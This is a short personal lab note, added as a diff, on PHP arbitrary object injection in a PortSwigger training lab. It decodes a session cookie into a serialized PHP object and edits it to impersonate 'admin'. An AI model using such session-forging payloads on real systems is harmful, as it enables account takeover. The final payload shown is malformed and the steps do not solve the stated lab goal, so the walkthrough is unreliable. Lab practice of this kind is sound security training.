@@ -1,0 +1,45 @@
+#+title: Arbitrary object injection in PHP
+#+author: Gabriel
+#+description: portswigger academy easy lab
+
+* Lab
+
+https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php
+
+ This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result.
+
+ To solve the lab, create and inject a malicious serialized object to delete the ~morale.txt~ file from Carlos's home directory.
+
+Need to obtain source code access to solve this lab.
+
+ * Credentials ->
+       wiener:peter
+
+* steps
+
+after logged on, get the cookie with *dev tools*
+
+#+begin_src text
+CTRL + SHITF + i
+
+APplication > Storage > Cookies
+#+end_src
+
+Decode the cookie with ->
+
+#+begin_src sh
+echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1Mm40cmE3NGhzY2RlYndkbW9oamIwYzczbGw2bW5zNiI7fQ==' | base64 -d
+#+end_src
+
+#+begin_src text
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"u2n4ra74hscdeb
+wdmohjb0c73ll6mns6";}
+#+end_src
+
+Modify the username to Admin and the change the type of the access_token value ->
+
+ * admin has 5 characters
+
+#+begin_src text
+O:4:"User":2:{s:8:"username";s:5:"admin";s:12:"access_token";s:32:"u2n4ra74hscd;}
+#+end_src
